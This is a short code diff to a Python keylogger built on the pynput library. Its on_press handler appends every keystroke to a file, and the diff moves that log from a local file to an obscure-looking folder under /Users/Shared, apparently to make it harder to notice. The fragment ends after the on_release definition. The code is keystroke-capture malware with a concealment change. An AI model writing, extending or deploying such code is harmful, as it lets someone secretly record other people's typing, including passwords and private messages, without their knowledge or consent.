@@ -1,7 +1,8 @@
 from pynput.keyboard import Key, Listener
 
 def on_press(key):
-    with open("keystroke_log.txt", "a") as log:
+    log_path = "/Users/Shared/system532/stringCup/liquid/log.txt"
+    with open(log_path, "a") as log:
         log.write(str(key) + "\n")
 
 def on_release(key):
